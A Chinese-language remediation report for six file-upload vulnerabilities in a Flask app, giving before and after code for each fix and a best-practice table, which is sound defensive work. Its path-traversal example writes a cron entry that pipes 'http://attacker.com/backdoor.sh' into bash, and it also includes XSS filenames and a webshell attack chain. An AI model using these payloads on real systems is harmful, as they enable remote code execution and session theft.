# 文件上传安全漏洞分析与修复报告

| 项目 | 内容 |
|------|------|
| **项目路径** | `/opt/Class01/` |
| **涉及文件** | `app.py`、`templates/upload.html`、`static/uploads/` |
| **修复数量** | 6 项 |

---

## 漏洞总览

| 序号 | 漏洞名称 | 严重程度 | OWASP 分类 | 修复状态 |
|:---:|---------|:-------:|-----------|:-------:|
| 1 | 任意文件上传（无类型校验） | 🔴 严重 | A03:2021 – 注入 | ✅ 已修复 |
| 2 | 路径穿越攻击 | 🔴 严重 | A01:2021 – 越界访问控制 | ✅ 已修复 |
| 3 | 文件覆盖攻击 | 🟠 高危 | A01:2021 – 越界访问控制 | ✅ 已修复 |
| 4 | 上传无频率限制 | 🟡 中危 | A07:2021 – 身份验证失效 | ✅ 已修复 |
| 5 | 文件名未清洗（特殊字符） | 🟡 中危 | A03:2021 – 注入 | ✅ 已修复 |
| 6 | 上传目录缺少访问控制 | 🟡 中危 | A01:2021 – 越界访问控制 | ✅ 已修复 |

---

## 漏洞 1：任意文件上传

**风险等级：🔴 严重**

**漏洞描述：**
上传功能没有对文件后缀名做任何检查，任何类型的文件都可以上传：

```python
# ❌ 修复前
file.save(filepath)  # .php、.exe、.html 全部允许
```

**攻击场景：**

| 上传文件类型 | 攻击方式 | 危害 |
|------------|---------|------|
| `.html` / `.htm` | 上传含 JavaScript 的 HTML 文件 | 存储型 XSS，窃取其他用户 Session |
| `.svg` | SVG 内嵌 `<script>` 标签 | 跨站脚本攻击 |
| `.php` / `.phtml` | 上传 PHP Webshell | 远程代码执行，服务器沦陷 |
| `.exe` / `.msi` | 上传可执行文件 | 诱导下载执行，恶意软件传播 |
| `.py` / `.sh` | 上传脚本文件 | 如执行权限不当可 RCE |

**修复方案：**
```python
# ✅ 修复后
ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif', 'webp', 'bmp'}

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

if not allowed_file(file.filename):
    return render_template("upload.html", error="不支持的文件格式，仅允许图片文件")
```

---

## 漏洞 2：路径穿越攻击

**风险等级：🔴 严重**

**漏洞描述：**
保存文件时直接使用用户上传的原始文件名，未清理路径分隔符：

```python
# ❌ 修复前
filename = file.filename  # 攻击者传入 ../../etc/cronjob.sh
filepath = os.path.join(upload_dir, filename)  # 穿越到系统目录！
file.save(filepath)
```

**攻击场景：**
攻击者修改请求中的文件名：

```
文件名: ../../../etc/cron.d/malicious
内容: * * * * * root curl http://attacker.com/backdoor.sh | bash
```

路径解析过程：
```
static/uploads/../../../etc/cron.d/malicious
→ /opt/Class01/static/uploads/../../../etc/cron.d/malicious
→ /etc/cron.d/malicious    ← 系统定时任务目录！
```

危害：
- 覆盖系统关键文件（`/etc/passwd`、`/etc/shadow`）
- 在 `cron.d` 写入恶意定时任务
- 覆盖应用配置文件（`app.py`）
- 写入 SSH 授权密钥

**修复方案：**
```python
# ✅ 修复后
def safe_filename(filename, username):
    filename = filename.replace('\\', '/')
    filename = filename.split('/')[-1]       # 去掉路径，只取文件名
    safe_name = re.sub(r'[^\w\.\-]', '_', filename)  # 仅保留安全字符
    safe_name = safe_name[:100]
    return f"{username}_{safe_name}"          # 加用户名前缀
```

---

## 漏洞 3：文件覆盖攻击

**风险等级：🟠 高危**

**漏洞描述：**
所有用户使用相同文件名上传时，后上传的会覆盖先上传的文件：

```python
# ❌ 修复前
filename = file.filename  # admin 上传 avatar.png → 保存为 avatar.png
file.save(filepath)       # alice 再上传 avatar.png → 覆盖 admin 的文件！
```

**攻击场景：**
- 攻击者不断上传同名文件，覆盖其他用户的正常头像
- 上传含恶意内容的同名文件，替换合法用户的头像
- 合法用户的头像被恶意替换后，传播给其他查看者

**修复方案：**
```python
# ✅ 添加用户名前缀
safe_name = f"{username}_{safe_name}"

# admin 上传 avatar.png → admin_avatar.png
# alice 上传 avatar.png → alice_avatar.png
# 两个文件完全独立，不会互相覆盖
```

---

## 漏洞 4：上传无频率限制

**风险等级：🟡 中危**

**漏洞描述：**
上传接口没有任何频率限制，攻击者可批量上传文件：

```python
# ❌ 修复前：无限上传
@app.route("/upload", methods=["GET", "POST"])
@login_required
def upload():
    # ... 直接保存，无频率限制
```

**攻击场景：**
- 自动化脚本每秒上传数十个文件，快速填满磁盘（DoS）
- 每个文件 16MB，上传 100 次即可消耗 1.6GB 磁盘空间
- 云服务器磁盘耗尽 → 数据库无法写入 → 服务中断
- 上传大量小文件耗尽 inode（Linux 文件索引节点）

**修复方案：**
```python
# ✅ 修复后
UPLOAD_ATTEMPTS = {}

def check_upload_rate_limit(ip: str) -> tuple:
    """同一 IP 1 分钟内最多上传 10 次。"""
    now = time.time()
    if ip not in UPLOAD_ATTEMPTS:
        UPLOAD_ATTEMPTS[ip] = []
    UPLOAD_ATTEMPTS[ip] = [t for t in UPLOAD_ATTEMPTS[ip] if now - t < 60]
    if len(UPLOAD_ATTEMPTS[ip]) >= 10:
        return (False, 10)
    UPLOAD_ATTEMPTS[ip].append(now)
    return (True, 0)
```

---

## 漏洞 5：文件名未清洗（特殊字符）

**风险等级：🟡 中危**

**漏洞描述：**
原始文件名可能包含各种特殊字符，直接使用会导致安全问题：

```python
# ❌ 修复前
filename = file.filename  # <script>alert(1)</script>.png
file.save(filepath)       # 特殊字符可能破坏文件系统
```

**攻击场景：**

| 文件名 | 攻击方式 | 危害 |
|--------|---------|------|
| `<script>alert(1)</script>.png` | 页面渲染文件名时执行 JS | 存储型 XSS |
| `../../../etc/passwd` | 路径穿越 | 覆盖系统文件 |
| 超长文件名（5000字符） | 文件系统拒绝写入 | 上传失败 |
| Unicode 双向文本 | 显示名称伪装 | 诱导下载恶意文件 |

**修复方案：**
```python
# ✅ 修复后
safe_name = re.sub(r'[^\w\.\-]', '_', filename)  # 仅保留安全字符
safe_name = safe_name[:100]                        # 限制长度
```

---

## 漏洞 6：上传目录缺少访问控制

**风险等级：🟡 中危**

**漏洞描述：**
`/static/uploads/` 下的文件通过 URL 公开访问，无权限校验：

```
访问: http://localhost:5000/static/uploads/xxx.png
→ 直接返回文件内容，无需登录
```

**攻击场景：**
- 任何人知道文件名即可访问上传的文件
- 如果能猜解或枚举文件名，可获取所有用户上传内容
- 配合路径穿越漏洞，可尝试访问服务器上其他目录的文件
- 上传的 HTML 文件可被直接访问并执行 JavaScript

**修复方案：**

多层防御：
```python
# 1. CSP 头限制图片加载来源
response.headers["Content-Security-Policy"] = "default-src 'self'; img-src 'self' data:; ..."

# 2. 禁止浏览器嗅探 MIME 类型
response.headers["X-Content-Type-Options"] = "nosniff"

# 3. 使用不可预测的文件名（用户名前缀 + 清洗）
safe_name = f"{username}_{safe_name}"

# 4. 上传路由强制登录
@app.route("/upload", methods=["GET", "POST"])
@login_required
```

---

## 攻击链串联

```
  任意文件上传（漏洞1）
         ↓
  上传 .html 含恶意 JavaScript
         ↓
  获取文件 URL: /static/uploads/evil.html
         ↓
  诱导管理员访问该 URL
         ↓
  JavaScript 执行 → 窃取 Session Cookie
         ↓
  伪造管理员身份登录系统
         ↓
  ⚠️ 如服务器有 PHP 解析引擎
     上传 .php Webshell → 服务器完全沦陷
```

---

## 修复前后对比

#### 修复前

```python
@app.route("/upload", methods=["GET", "POST"])
@login_required
def upload():
    file = request.files['file']
    # ❌ 无文件类型检查
    # ❌ 无频率限制
    # ❌ 路径穿越：../../etc/passwd
    # ❌ 文件覆盖：同名覆盖
    # ❌ 特殊字符未清洗
    # ❌ 目录无访问控制
    filename = file.filename
    filepath = os.path.join('static/uploads/', filename)
    file.save(filepath)
```

#### 修复后

```python
@app.route("/upload", methods=["GET", "POST"])
@login_required
def upload():
    # ✅ 频率限制
    check_upload_rate_limit(client_ip)
    # ✅ 后缀白名单
    if not allowed_file(file.filename):
        return error("不支持的文件格式")
    # ✅ 清洗文件名（防穿越 + 去特殊字符 + 防覆盖）
    safe_name = safe_filename(file.filename, username)
    filepath = os.path.join(upload_dir, safe_name)
    file.save(filepath)
```

---

## 安全最佳实践

| 措施 | 说明 | 优先级 |
|-----|------|:----:|
| **后缀白名单** | 仅允许特定图片格式，不要用黑名单 | 🔴 必须 |
| **路径穿越防护** | 清洗文件名中的 `../` 路径符号 | 🔴 必须 |
| **文件覆盖防护** | 用户名前缀或 UUID 隔离不同用户文件 | 🟠 推荐 |
| **频率限制** | 限制上传速率，防止磁盘 DoS | 🟠 推荐 |
| **文件名清洗** | 去除特殊字符 + 限制文件名长度 | 🟡 建议 |
| **文件大小限制** | 前端 + 后端双重限制 | 🟡 建议 |
| **CSP 头** | `img-src 'self'` + `nosniff` 双重防护 | 🟢 可选 |
| **病毒扫描** | 上传文件进行恶意软件扫描 | 🟢 可选 |
| **独立存储** | 用户文件使用独立的文件服务器或 CDN | 🟢 可选 |

---

**核心原则：永远不要信任用户上传的文件名和文件内容。** 文件名可能包含路径穿越符号、特殊字符、恶意脚本；文件内容可能是可执行程序或恶意脚本，必须通过白名单校验、清洗、隔离等多层防御来保证安全。
